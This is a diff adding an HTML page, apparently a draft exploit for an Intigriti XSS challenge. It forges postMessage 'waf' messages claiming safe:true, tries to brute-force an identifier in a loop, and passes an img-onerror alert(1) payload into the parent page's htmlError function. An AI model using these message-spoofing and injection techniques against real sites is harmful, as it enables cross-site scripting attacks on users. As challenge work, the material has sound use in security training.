@@ -1,0 +1,65 @@
+<!-- FOR INTIGRITI CHALLENGE -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Temp</title>
+</head>
+<body>
+    <script>
+        // window.parent.frames[0].postMessage({
+        //     type:"waf",
+        //     safe:true,
+        //     str:"foobar"
+        // });
+
+        // function bruteforce() {
+        //     for (let i=0; i<1e10; i++){
+        //         for (let j=0; j<1e10; j++){
+        //             let id = i.toString(32) + j.toString(32);
+                    
+        //         }
+        //     }
+        // }
+        let j = 0;
+        let loopb = function() {
+            if (j >= 1e10){
+                return false;
+            }
+            let id = i.toString(32) + j.toString(32);
+                window.parent.postMessage({
+                    type:"waf",
+                    safe:true,
+                    str:"TROLOLOL",
+                    identifier:id
+            })
+            j++;
+            // requestAnimationFrame(loopb);
+            return true;
+        }
+        let i=0;
+        let loop = function() {
+            if(loopb()){
+                requestAnimationFrame(loop);
+            } else {
+                if (i < 1e10){
+                    j = 0;
+                    i++;
+                    console.log(i);
+                    requestAnimationFrame(loop);
+                } else {
+                    alert("complete");
+                }
+            }
+        }
+
+        // loop();
+        window.parent.htmlError("<img src=x onerror='alert(1)'/>",true);
+        window.addEventListener("message",e=>{
+            console.log(e.data);
+        });
+    </script>
+</body>
+</html>
